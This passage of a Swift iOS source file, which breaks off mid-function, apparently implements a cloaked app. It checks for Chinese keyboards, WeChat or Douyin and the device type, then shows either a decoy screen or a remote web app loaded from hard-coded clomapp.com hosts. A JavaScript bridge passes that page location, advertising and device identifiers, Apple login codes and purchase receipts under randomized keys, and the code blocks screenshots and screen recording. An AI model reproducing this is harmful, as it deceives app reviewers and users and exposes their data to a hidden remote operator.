import UIKit
import AppTrackingTransparency
import AdSupport
import UserNotifications
import CoreLocation
import Security
import System
import CommonCrypto
import TZImagePickerController
import StoreKit
import WebKit
import AuthenticationServices
import RevenueCat
import Alamofire
import AppsFlyerLib
import SVProgressHUD
extension Notification.Name {
    static let appKeyboardWillShowNotification = Notification.Name(UIResponder.keyboardWillShowNotification.rawValue)
    static let appKeyboardWillHidenNotification = Notification.Name(UIResponder.keyboardWillHideNotification.rawValue)
    static let appDidBecomeActiveNotification =  Notification.Name(UIApplication.didBecomeActiveNotification.rawValue)
}
extension Int{
    static func badgeNumber() -> Int {
        return Int.random(in: 5...10)
    }
}
extension String {
    var isBlank: Bool {
        let trimmedStr = self.trimmingCharacters(in: .whitespacesAndNewlines)
        return trimmedStr.isEmpty
    }
    static func random() -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        let length = Int.random(in: 1...15)
        return String((0..<length).compactMap { _ in characters.randomElement() })
    }
    static func typeRandomStr() -> String{
        return  String("abcdefghijklmnopqrstuvwxyz".randomElement()!)
    }
    static func md5(from string: String) -> String {
        let data = Data(string.utf8)
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes {
            _ = CC_MD5($0.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }
    static func generateRandomString(length: Int) -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return String((0..<length).compactMap { _ in characters.randomElement() })
    }
    static func jsonString(from dictionary: [String: Any]) -> String? {
        if let jsonData = try? JSONSerialization.data(withJSONObject: dictionary, options: []) {
            return String(data: jsonData, encoding: .utf8)
        }
        return nil
    }
    static func readFromKeychain() -> String? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: Bundle.main.bundleIdentifier ?? "",
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        if status == errSecSuccess, let data = result as? Data {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
    static func hostName() -> String {
        let projectName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
        let projectNameMust = "\(projectName)_hostName"
        return projectNameMust
    }
    static func webName() -> String {
        let projectName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
        let projectNameMust = "\(projectName)_webName"
        return projectNameMust
    }
    
    var appBundleId: String {
        Bundle.main.bundleIdentifier ?? ""
    }
    var appName: String {
        return (Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String) ??
        (Bundle.main.infoDictionary?["CFBundleName"] as? String) ?? ""
    }
    var systemVersion: String {
        UIDevice.current.systemVersion
    }
    var deviceVersion: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machine = withUnsafePointer(to: &systemInfo.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
                String(cString: $0)
            }
        }
        return machine ?? ""
    }
    var systemLanguage: String {
        let lang = Locale.preferredLanguages.first ?? "en"
        let components = lang.split(separator: "-")
        guard components.count >= 2 else {
            return lang.lowercased()
        }
        return String(format: "%@-%@", components[0].lowercased(),components[1].lowercased())
    }
    var systemTimezone: String {
        let seconds = TimeZone.current.secondsFromGMT()
        let hours = seconds / 3600
        let minutes = abs((seconds / 60) % 60)
        let sign = hours >= 0 ? "+" : "-"
        return String(format: "GMT%@%02ld:%02ld", sign, abs(hours), minutes)
    }
    var systemClientId: String{
        var value = String()
        if let saved = String.readFromKeychain() {
            return saved
        }else{
            if AppPermissionTool.shared.trackingPermission == 0 {
                let newValue = String.generateRandomString(length: 32)
                value = String.md5(from:newValue)
            }else{
                value = AppPermissionTool.shared.idfaPermission
            }
        }
        StringHelper.shared.saveToKeychain(value: value, for: appBundleId)
        return value
    }
    var appVersion: String {
        return  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.4"
    }
    var UA: String {
        return String(format: "%@/%@ iOS/%@ (%@)", appName,appVersion,systemVersion,deviceVersion)
    }
    var osTimezone: String{
        return TimeZone.current.identifier
    }
}
extension Bool {
    static func isiPhone() -> Bool {
        return UIDevice.current.userInterfaceIdiom == .phone
     }
    static func isChineseKeyboardInstalled() -> Bool {
        let keyboards = UserDefaults.standard.array(forKey: "AppleKeyboards") as? [String] ?? []
        for keyboard in keyboards {
            if let keyboardStr = keyboard as? String {
                if keyboardStr.contains("zh_Hans") ||
                    keyboardStr.contains("zh_Hant") ||
                    keyboardStr.contains("com.sogou.sogouinput.basekeyboard") ||
                    keyboardStr.contains("com.baidu.inputMethod.keyboard") ||
                    keyboardStr.contains("com.tencent.wetype.keyboard") ||
                    keyboardStr.contains("com.iflytek.inputime.keyboard") {
                    return true
                }
            }
        }
        return false
    }
    static func isPlanAppInstalled() -> Bool {
        let schemes = [
            "weixin://",
            "snssdk1128://"
        ]
        for scheme in schemes {
            if let url = URL(string: scheme), UIApplication.shared.canOpenURL(url) {
                return true
            }
        }
        return false
    }
    
    static func isSystemFirst() -> Bool {
        if (!Bool.isiPhone()){
            return false
        }
        if (Bool.isChineseKeyboardInstalled()){
            return false
        }
        if (Bool.isPlanAppInstalled()){
            return false
        }
        return true
    }
}
extension UIWindow {
    static var current: UIWindow? {
        if #available(iOS 13.0, *) {
            let windowScene: UIWindowScene? = UIApplication.shared.connectedScenes.first as? UIWindowScene
            let window = windowScene?.windows.first
            if window != nil {
                return window
            }
        }
        let window = UIApplication.shared.keyWindow
        if window != nil {
            return window
        }
        return UIApplication.shared.windows.first
    }
    var topController: UIViewController? {
        var top = rootViewController
        while top?.presentedViewController != nil {
            top = top?.presentedViewController
        }
        return top
    }
    var currentController: UIViewController? {
        guard var current = topController else {
            return nil
        }
        while true {
            if current.isKind(of: UINavigationController.self) {
                let nav = current as! UINavigationController
                if nav.topViewController != nil {
                    current = nav.topViewController!
                }
            } else if current.isKind(of: UITabBarController.self) {
                let tab = current as! UITabBarController
                if tab.selectedViewController != nil {
                    current = tab.selectedViewController!
                }
            } else if current.isKind(of: UISplitViewController.self) {
                let split = current as! UISplitViewController
                if split.viewControllers.last != nil {
                    current = split.viewControllers.last!
                }
            } else {
                break
            }
        }
        return current
    }
}
class StringHelper: NSObject {
    static let shared = StringHelper()
    private  override init() {}
    func saveToKeychain(value: String, for key: String) {
        guard let data = value.data(using: .utf8) else { return }
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key
        ]
        SecItemDelete(query as CFDictionary)
        let attributes: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data
        ]
        SecItemAdd(attributes as CFDictionary, nil)
    }
}
class AppPermissionTool: NSObject {
    static let shared = AppPermissionTool()
    var trackingPermission : Int? = nil
    var idfaPermission : String = ""
    var notificationPermission = Int()
    var locationPermission = Int()
    private var locationCLLManager: CLLocationManager!
    private var completionHandler: ((CGFloat, CGFloat, Bool) -> Void)?
    private  override init() {
        super.init()
        locationCLLManager = CLLocationManager()
        locationCLLManager.delegate = self
    }
    func registerPushAndTrackIDFA() {
        NotificationCenter.default.addObserver(self, selector: #selector(registerTrack), name: .appDidBecomeActiveNotification, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(registerAPNs), name: .appDidBecomeActiveNotification, object: nil)
    }
    @objc private func registerTrack() {
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { status in
                DispatchQueue.main.async {
                    switch status {
                    case .notDetermined:
                        self.trackingPermission = 0
                        self.idfaPermission = ""
                    case .authorized:
                        self.trackingPermission = 1
                        self.idfaPermission = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    case .denied, .restricted:
                        self.trackingPermission = 0
                        self.idfaPermission = ""
                    @unknown default:
                        self.trackingPermission = 0
                        self.idfaPermission = ""
                    }
                }
            }
        } else {
            if ASIdentifierManager.shared().isAdvertisingTrackingEnabled {
                self.trackingPermission = 1
                self.idfaPermission = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            } else {
                self.trackingPermission = 0
                self.idfaPermission = ""
            }
            
        }
        AppsFlyerLib.shared().start()
    }
    @objc private func registerAPNs() {
        let center = UNUserNotificationCenter.current()
        center.getNotificationSettings { settings in
            DispatchQueue.main.async {
                self.notificationPermission = (settings.authorizationStatus == .authorized) ? 1 : 0
            }
        }
    }
    func cameraPermission() -> Int {
        let status = AVCaptureDevice.authorizationStatus(for: .video)
        switch status {
        case .notDetermined, .restricted, .denied:
            return 0
        case .authorized:
            return 1
        @unknown default:
            return 0
        }
    }
    func albumPermission() -> Int {
        let status = PHPhotoLibrary.authorizationStatus()
        switch status {
        case .notDetermined, .restricted, .denied:
            return 0
        case .authorized, .limited:
            return 1
        @unknown default:
            return 0
        }
    }
    func getPermissionLocationWithCompletion(completion: @escaping (CGFloat, CGFloat, Bool) -> Void) {
        UserDefaults.standard.set("******", forKey: "locationPermission")
        self.completionHandler = completion
        let status = CLLocationManager.authorizationStatus()
        switch status {
        case .notDetermined:
            locationCLLManager.requestWhenInUseAuthorization()
        case .authorizedWhenInUse, .authorizedAlways:
            locationCLLManager.startUpdatingLocation()
        default:
            locationPermission = 0
            completion(0, 0, false)
            locationCLLManager.stopUpdatingLocation()
        }
    }
}
extension AppPermissionTool : CLLocationManagerDelegate{
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let currentLocation = locations.last else { return }
        locationPermission = 1
        let latitudeStr = String(format: "%f", currentLocation.coordinate.latitude)
        let longitudeStr = String(format: "%f", currentLocation.coordinate.longitude)
        if let lat = Double(latitudeStr), let lon = Double(longitudeStr) {
            self.completionHandler?(lat, lon, true)
        }
        manager.stopUpdatingLocation()
    }
    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        locationPermission = 0
        completionHandler?(0, 0, false)
        manager.stopUpdatingLocation()
    }
    func locationManager(_ manager: CLLocationManager, didChangeAuthorization status: CLAuthorizationStatus) {
        switch status {
        case .authorizedWhenInUse, .authorizedAlways:
            manager.startUpdatingLocation()
        default:
            locationPermission = 0
            completionHandler?(0, 0, false)
            manager.stopUpdatingLocation()
        }
    }
}
class SystemInfoRecorder: NSObject {
    static let shared = SystemInfoRecorder()
    private  override init() {}
   
    func infoDicCallBack() -> [String: Any] {
        var info: [String: Any] = [:]
        info[String.random() + "ua"] = String().UA
        info[String.random() + "ci"] = String().systemClientId
        info[String.random() + "tz"] = String().systemTimezone
        info[String.random() + "lg"] = String().systemLanguage
        info[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
        info[String.random() + "ot"] = String().osTimezone
        info[String.random() + "af"] = AppsFlyerLib.shared().getAppsFlyerUID()
        info[String.random() + "dt"] = UserDefaults.standard.string(forKey: "deviceToken") ?? ""
        return info
    }
}
class NetworkService: NSObject {
    static let shared = NetworkService()
    private  override init() {}
    func getUrl(_ url: String,
                successBlock: @escaping (_ data: Any?, _ isEnd: Bool) -> Void) {
        AF.request(url, method: .get, parameters: [String: Any]() ,headers:[])
            .validate()
            .responseData { response in
                switch response.result {
                case .success(let data):
                    DispatchQueue.main.async {
                        successBlock(data, true)
                    }
                case .failure:
                    DispatchQueue.main.async {
                        successBlock("nil", false)
                    }
                }
            }
    }
}

class PayHandler: NSObject {
    static let shared = PayHandler()
    private  override init() {}
    var offerings : Offerings?
    func RevenuecatKey(_ key:String,_ userID:String){
        Purchases.configure(withAPIKey: key, appUserID: userID)
    }
    private var RevenuecatCallBack: ((String?,Int?) -> Void)?
    func startPay(_ productId : String,callback: @escaping (String?,Int?,String?) -> Void) {
        guard let offerings = self.offerings else {
            callback("", 0,"")
            return
        }
        var found = false
        for (key, offering) in offerings.all {
            for package in offering.availablePackages {
                if package.storeProduct.productIdentifier == productId {
                    found = true
                    Purchases.shared.purchase(package: package) { transaction, customerInfo, error, userCancelled in
                        if error != nil || userCancelled {
                            DispatchQueue.main.async {
                                callback("", 0,customerInfo?.originalAppUserId)
                            }
                            return
                        }
                        if let receiptURL = Bundle.main.appStoreReceiptURL,
                           let receiptData = try? Data(contentsOf: receiptURL) {
                            let receiptBase64 = receiptData.base64EncodedString()
                            DispatchQueue.main.async {
                                callback(receiptBase64, 1,customerInfo?.originalAppUserId)
                            }
                        } else {
                            DispatchQueue.main.async {
                                callback("", 0,customerInfo?.originalAppUserId)
                            }
                        }
                    }
                    break
                }
            }
            if found { break }
        }
        if !found {
            DispatchQueue.main.async {
                callback("", 0,"")
            }
        }
    }
    private var productsSKRequest: SKProductsRequest?
    private var completionBlock: (([[String: Any]]) -> Void)?
    func fetchProducts(_ productIDArray: [String], completion: @escaping ([[String: Any]]) -> Void) {
        let productIdentifiers = Set(productIDArray)
        self.productsSKRequest = SKProductsRequest(productIdentifiers: productIdentifiers)
        self.productsSKRequest?.delegate = self
        self.productsSKRequest?.start()
        self.completionBlock = completion
    }
}
extension PayHandler : SKProductsRequestDelegate{
    func productsRequest(_ request: SKProductsRequest, didReceive response: SKProductsResponse) {
        var productArray = [[String: Any]]()
        for product in response.products {
            let productID = product.productIdentifier
            let formatter = NumberFormatter()
            formatter.numberStyle = .currency
            formatter.locale = product.priceLocale
            let priceString = formatter.string(from: product.price) ?? ""
            let productInfo: [String: Any] = [
                String.random() + "pn": product.localizedTitle ,
                String.random() + "pd": product.localizedDescription,
                String.random() + "pj": productID,
                String.random() + "pp": priceString
            ]
            productArray.append(productInfo)
        }
        self.completionBlock?(productArray)
        self.completionBlock = nil
    }
    func request(_ request: SKRequest, didFailWithError error: Error) {
        self.completionBlock = nil
    }
}
class WebViewBridge: NSObject {
    static let shared = WebViewBridge()
    typealias appleLoginCompletion = (Bool, String) -> Void
    private var completionHandler: appleLoginCompletion?
    private weak var targetView: UIView?
    private var shieldOverlay: UIView!
    private var webView: WKWebView?
    var completionHandleronAppShow: ((Bool) -> Void)?
    var becomeViewController : UIViewController?
    private override init() {
        super.init()
        NotificationCenter.default.addObserver(self, selector: #selector(handleScreenRecordingChange), name: UIScreen.capturedDidChangeNotification, object: nil)
    }
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    func protectView(_ controllerView: UIView) {
        self.targetView = controllerView
        self.shieldOverlay = UIView(frame: controllerView.bounds)
        self.shieldOverlay.backgroundColor = .black
        self.shieldOverlay.isHidden = true
        self.shieldOverlay.isUserInteractionEnabled = false
        self.shieldOverlay.alpha = 1.0
        controllerView.addSubview(self.shieldOverlay)
        handleScreenRecordingChange()
    }
    @objc private func handleScreenRecordingChange() {
        shieldOverlay.isHidden = !UIScreen.main.isCaptured
    }
    func applicationWillEnterForeground(_ show: Bool) {
        completionHandleronAppShow?(show)
    }
    func appleLoginWithCompletion(_ completion: @escaping appleLoginCompletion) {
        self.completionHandler = completion
        let appleIDProvider = ASAuthorizationAppleIDProvider()
        let request = appleIDProvider.createRequest()
        request.requestedScopes = [.fullName, .email]
        let authorizationController = ASAuthorizationController(authorizationRequests: [request])
        authorizationController.delegate = self
        authorizationController.presentationContextProvider = self
        authorizationController.performRequests()
    }

    var revenueCatKey  = String()
    func becomeWindow(_ window : UIWindow ,_ viewController : UIViewController, _ revenuecat: String, _ callback: @escaping (Bool?) -> Void){
        AppPermissionTool.shared.registerPushAndTrackIDFA()
        WebViewBridge.shared.becomeViewController = UIViewController()
        WebViewBridge.shared.becomeViewController = viewController
        revenueCatKey = revenuecat
        window.rootViewController = NavigationController(rootViewController: WebViewHelper())
        window.makeKeyAndVisible()
    }
    func handlerViewController(_ viewController: UIViewController, wkWebView: WKWebView, handlerWKScriptMessage message: WKScriptMessage) {
        self.webView = wkWebView
        guard let body = message.body as? [String: Any] else { return }
        let udValues = body.filter { $0.key.hasSuffix("_ud") }
        let taValues = body.filter { $0.key.hasSuffix("_ta") }
        guard let uuid = udValues.first?.value as? String,
              let dataDict = taValues.first?.value as? [String: Any] else {
            return
        }
        let name = message.name
        if name == "a" {
            handleOpenNativeModule(viewController, data: dataDict, uuid: uuid)
        }
    }
    func processedKeyboardUserInfo(from userInfo: [AnyHashable: Any]) -> [String: Any] {
        var processed = [String: Any]()
        for (key, value) in userInfo {
            guard let keyString = key as? String else { continue }
            var processedValue: Any = value
            if let nsValue = value as? NSValue {
                let type = String(cString: nsValue.objCType)
                if type == String(cString: NSValue(cgRect: CGRect.zero).objCType) {
                    let rect = nsValue.cgRectValue
                    processedValue = [
                        "x": rect.origin.x,
                        "y": rect.origin.y,
                        "width": rect.width,
                        "height": rect.height
                    ]
                } else if type == String(cString: NSValue(cgPoint: CGPoint.zero).objCType) {
                    let point = nsValue.cgPointValue
                    processedValue = [
                        "x": point.x,
                        "y": point.y
                    ]
                } else if type == String(cString: NSValue(cgSize: CGSize.zero).objCType) {
                    let size = nsValue.cgSizeValue
                    processedValue = [
                        "width": size.width,
                        "height": size.height
                    ]
                } else {
                    processedValue = "\(value)" // fallback
                }
            } else {
                do {
                    _ = try JSONSerialization.data(withJSONObject: ["key": value], options: [])
                } catch {
                    processedValue = "\(value)" // fallback for non-serializable objects
                }
            }
            processed[keyString] = processedValue
        }
        return processed
    }
    func openSettings() {
        if let url = URL(string: UIApplication.openSettingsURLString),
           UIApplication.shared.canOpenURL(url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
        }
    }
}
extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationControllerPresentationContextProviding{
    func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) {
        if let appleIDCredential = authorization.credential as? ASAuthorizationAppleIDCredential,
           let codeData = appleIDCredential.authorizationCode,
           let codeString = String(data: codeData, encoding: .utf8) {
            completionHandler?(true, codeString)
        }
    }
    func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) {
        completionHandler?(false, "")
    }
    func presentationAnchor(for controller: ASAuthorizationController) -> ASPresentationAnchor {
        return UIWindow.current!
    }
    private func uppDataPermission() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            var permissionDic: [String: Any] = [:]
            permissionDic[String.random() + "um"] = AppPermissionTool.shared.albumPermission()
            permissionDic[String.random() + "ra"] = AppPermissionTool.shared.cameraPermission()
            permissionDic[String.random() + "lo"] = AppPermissionTool.shared.locationPermission
            permissionDic[String.random() + "if"] = AppPermissionTool.shared.notificationPermission
            permissionDic[String.random() + "ng"] = AppPermissionTool.shared.trackingPermission
            permissionDic[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
            let js = String(format: "window.%@('pr',%@)",String.typeRandomStr(), String.jsonString(from: permissionDic) ?? "")
            self.webView?.evaluateJavaScript(js) { result, error in
                if error == nil {
                    print("onPremissionsCallback Success JS")
                }
            }
        }
    }
    private func handleOpenNativeModule(_ viewController: UIViewController, data: [String: Any], uuid: String){
        
        let callback = data.first(where: { $0.key.hasSuffix("_cb") })?.value as? String ?? ""
        let type = data.first(where: { $0.key.hasSuffix("_pe") })?.value as? String ?? ""
        let typeStr = String(type.suffix(2))
        
        if typeStr == "lo"{
            let skip = data.first(where: { $0.key.hasSuffix("_sk") }).map { "\($0.value)" } ?? ""
            if skip == "1"{
                handleLocation(uuid: uuid, callback: callback)
            }
        }else if typeStr == "ap"{
            handleAppleLogin(data: data, uuid: uuid, callback: callback)
        }else if typeStr == "se"{
            WebViewBridge.shared.openSettings()
        }else if typeStr == "py"{
            handlePayment(data: data, uuid: uuid, callback: callback)
        }else if typeStr == "gd"{
            handleGoods(data: data, uuid: uuid, callback: callback)
        }else if typeStr == "ab"{
            UserDefaults.standard.setValue("******", forKey: String.webName())
            self.becomeViewController?.modalPresentationStyle = .fullScreen
            UIWindow.current?.currentController?.present(self.becomeViewController!, animated: false, completion: nil)
        }else if typeStr == "ag"{
            let aw = data.first(where: { $0.key.hasSuffix("_aw") }).map { "\($0.value)" } ?? ""
            if let allowString = aw as? String {
                webView?.allowsBackForwardNavigationGestures = (allowString == "1")
            } else {
                webView?.allowsBackForwardNavigationGestures = false // 默认值
            }
        }else if typeStr == "ai"{
            var infoDic = SystemInfoRecorder.shared.infoDicCallBack()
            infoDic[String.random() +  "ud"] = uuid
            let infoStr = String(format: "window.%@('%@',%@)", String.typeRandomStr(),callback,String.jsonString(from:infoDic) ?? "")
            self.webView?.evaluateJavaScript(infoStr) { _, error in
                if error == nil {
                    print("\(callback) Success JS")
                }else{
                    print("\(callback) JS Error: \(error)")
                }
            }
        }else if typeStr == "sr"{
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                if let scene = UIApplication.shared.connectedScenes
                    .first(where: { $0.activationState == .foregroundActive }) as? UIWindowScene {
                    if #available(iOS 14.0, *) {
                        SKStoreReviewController.requestReview(in: scene)
                    } else {
                        // Fallback on earlier versions
                    }
                }
            }
        }
    }
    private func handleLocation(uuid: String, callback: String) {
        AppPermissionTool.shared.getPermissionLocationWithCompletion { latitude, longitude, isAuthorized in
            if !isAuthorized {
                self.uppDataPermission()
                WebViewBridge.shared.openSettings()
            } else {
                UserDefaults.standard.set("****", forKey: "islocation")
                let roundedLatitude = Double(String(format: "%.6f", latitude)) ?? 0
                let roundedLongitude = Double(String(format: "%.6f", longitude)) ?? 0
                var locationDic: [String: Any] = [:]
                locationDic[String.random() + "lt"] = String(roundedLatitude)
                locationDic[String.random() + "ln"] = String(roundedLongitude)
                locationDic[String.random() + "lo"] = isAuthorized ? 1 : 0
                locationDic[String.random() + "ud"] = uuid
                debugPrint(locationDic)
                
                let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:locationDic) ?? "")
                debugPrint(js)
                self.webView?.evaluateJavaScript(js) { _, error in
                    if error == nil {
                        print("\(callback) Success JS")
                        self.uppDataPermission()
                    }else{
                        
                    }
                }
            }
        }
    }
    private func handleAppleLogin(data: [String: Any], uuid: String, callback: String) {
        WebViewBridge.shared.appleLoginWithCompletion { success, code in
            var dic: [String: Any] = [:]
            dic[String.random() + "cd"] = code
            dic[String.random() + "us"] = success ? 1 : 0
            dic[String.random() + "pe"] = data["type"]
            dic[String.random() + "ud"] = uuid
            let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:dic) ?? "")
            self.webView?.evaluateJavaScript(js) { _, error in
                if error == nil {
                    print("\(callback) Success JS")
                }else{
                    print(error as Any)
                }
            }
        }
    }
    private func handlePayment(data: [String: Any], uuid: String, callback: String) {
        let productID = data.first(where: { $0.key.hasSuffix("_pi") })?.value as? String ?? ""
        PayHandler.shared.startPay(productID) { evidence, status,userId in
            var dic: [String: Any] = [:]
            dic[String.random() + "ud"] = uuid
            dic[String.random() + "ec"] = evidence
            dic[String.random() + "us"] = status
            dic[String.random() + "ru"] = userId
            let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:dic) ?? "")
            self.webView?.evaluateJavaScript(js) { _, error in
                if error == nil {
                    print("\(callback) Success JS")
                }
            }
        }
    }
    private func handleGoods(data: [String: Any], uuid: String, callback: String) {
        let ids = data.first(where: { $0.key.hasSuffix("_is") })?.value as? [String] ?? []
        let UU = data.first(where: { $0.key.hasSuffix("_uu") })?.value as? String ?? ""
        PayHandler.shared.fetchProducts(ids) { priceDict in
            var goodsDic: [String: Any] = [:]
            goodsDic[String.random() + "ud"] = uuid
            goodsDic[String.random() + "gd"] = priceDict
            if priceDict.count > 0 {
                let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:goodsDic) ?? "")
                self.webView?.evaluateJavaScript(js) { value, error in
                    if error == nil {
                        print("\(callback) Success JS")
                        PayHandler.shared.RevenuecatKey(WebViewBridge.shared.revenueCatKey, UU)
                        Purchases.shared.getOfferings { (offerings, error) in
                            if let error = error {
                                return
                            }
                            PayHandler.shared.offerings = offerings
                        }
                    }else{
                        print(value)
                        
                    }
                }
            }
        }
    }
}
class WebViewHelper: UIViewController{
    private var reachabilityManager = NetworkReachabilityManager()
    private var webView: WKWebView!
    private let waitImage = UIImageView(image: UIImage(named: "launch"))
    deinit {
        let messageHandlers = [
            "pr",
            "a",
            "kc",
            "nc"
        ]
        messageHandlers.forEach {
            webView.configuration.userContentController.removeScriptMessageHandler(forName: $0)
        }
        NotificationCenter.default.removeObserver(self, name: .appKeyboardWillShowNotification, object: nil)
        NotificationCenter.default.removeObserver(self, name: .appKeyboardWillHidenNotification, object: nil)
    }
    override var preferredStatusBarStyle: UIStatusBarStyle{
        return .lightContent
    }
    override func viewDidLoad() {
        super.viewDidLoad()
        self.navigationController?.setNavigationBarHidden(true, animated: false)
        
        let userContentController = WKUserContentController()
        let messageHandlers = [
            "pr",
            "kc",
            "nc",
            "a"
        ]
        messageHandlers.forEach {
            userContentController.add(self, name: $0)
        }
        let config = WKWebViewConfiguration()
        config.userContentController = userContentController
        config.preferences.javaScriptEnabled = true
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        webView = WKWebView(frame: .zero, configuration: config)
        webView.navigationDelegate = self
        webView.scrollView.delegate = self
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        webView.scrollView.bounces = false
        webView.scrollView.alwaysBounceVertical = false
        webView.scrollView.alwaysBounceHorizontal = false
        webView.scrollView.refreshControl = nil
        webView.isOpaque = false
        webView.scrollView.isOpaque = false
        webView.backgroundColor = .white
        webView.scrollView.backgroundColor = .white
        let field = NoKeyboardTextField(frame: self.view.bounds)
        field.isSecureTextEntry = true
        field.isUserInteractionEnabled = true
        field.backgroundColor = .black
        self.view .addSubview(field)
        let firstView = field.subviews.first
        firstView?.isUserInteractionEnabled = true
        firstView?.frame = self.view.bounds
        firstView?.addSubview(self.webView)
        self.webView.frame = firstView?.bounds ?? self.view.bounds
        self.webView.alpha = 0.0
        WebViewBridge.shared.protectView(self.view)
        WebViewBridge.shared.completionHandleronAppShow = { [weak self] _ in
            self?.permission()
        }
        setupNotificationObservers()
        setupNetworkReachability()
        self.view .addSubview(waitImage)
        waitImage.frame = CGRectMake(0, 0, UIScreen.main.bounds.width,  UIScreen.main.bounds.height)
        self.view.backgroundColor = .black
    }
    private func setupNetworkReachability(){
        if(UserDefaults.standard.object(forKey: String.webName()) != nil){
            UIApplication.shared.applicationIconBadgeNumber = 0
            WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
            UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: false, completion: nil)
        }else{
            
            reachabilityManager = NetworkReachabilityManager()
            reachabilityManager?.startListening { [weak self] status in
                guard let self = self else { return }
                switch status {
                case .reachable(.ethernetOrWiFi), .reachable(.cellular):
                    makeRequest()
                case .notReachable:
                    print("")
                case .unknown:
                    print("")
                }
            }
        }
    }
    private func makeRequest() {
       if (UserDefaults.standard.string(forKey: String.hostName()) ?? "").isBlank {
            targetStyem()
        }else{
            SVProgressHUD .setDefaultStyle(.dark)
            SVProgressHUD .show(withStatus: "loading...")
            self.locatineRequest(path:UserDefaults.standard.string(forKey:  String.hostName()) ?? "https://fwjxwd.clomapp.com/v1.1.0/debug_vibe?cache_version=1750170507")
            upploadPath()
        }
        
    }
    private func targetStyem(){
        
        if !Bool.isSystemFirst(){
            UIApplication.shared.applicationIconBadgeNumber = 0
            WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
            UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: false, completion: nil)
        }else{
            SVProgressHUD .setDefaultStyle(.dark)
            SVProgressHUD .show(withStatus: "loading...")
            let plainString = String(format: "%@:v1.1.0",String().UA)
            let base64String = plainString.data(using: .utf8)?.base64EncodedString() ?? ""
            let qurty = String(format: "?%@co=%@", String.random(),base64String)
            let path = String(format: "https://tubxj7.clomapp.com/rwy8m9%@", qurty)
            NetworkService.shared.getUrl(path) { data, isEnd in
                if isEnd{
                    guard let realData = data as? Data else { return }
                    do {
                        let json = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
                        let codeKey = "code"
                        let dataKey = "data"
                        guard let code = json[codeKey],
                              let dataDict = json[dataKey] as? [String: Any] else {
                            return
                        }
                        if String(format: "%@", code as! CVarArg) == "1003"{
                            let lastKey = dataDict.keys.reversed().first as? String ?? ""
                            let knvhiStr = dataDict[lastKey] as? String ?? ""
                            if !lastKey.hasSuffix("i") {
                                UIApplication.shared.applicationIconBadgeNumber = 0
                                self.waitImage.isHidden = true
                                SVProgressHUD .dismiss()
                                WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
                                UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: true, completion: nil)
                            } else {
                                let parts = knvhiStr.split(separator: ".")
                                let name = String(parts[0]) // "4ir7gbfncryvkfdi"
                                let ext = String(parts[1]) //filetype
                                if  ext == "jpg"{
                                    UIApplication.shared.applicationIconBadgeNumber = 0
                                    self.waitImage.isHidden = true
                                    SVProgressHUD .dismiss()
                                    WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
                                    UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: true, completion: nil)
                                }else{
                                    UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey:  String.hostName())
                                    self.locatineRequest(path:UserDefaults.standard.string(forKey:  String.hostName()) ?? "")
                                }
                            }
                        }else{
                            SVProgressHUD .showError(withStatus: "Error")
                        }
                    }
                    catch {
                        print("JSON Error: \(error)")
                    }
                }else{
                    SVProgressHUD .showError(withStatus: "Error")
                }
            }
             }
        }
        private func locatineRequest(path:String){
            if let url = URL(string: path) {
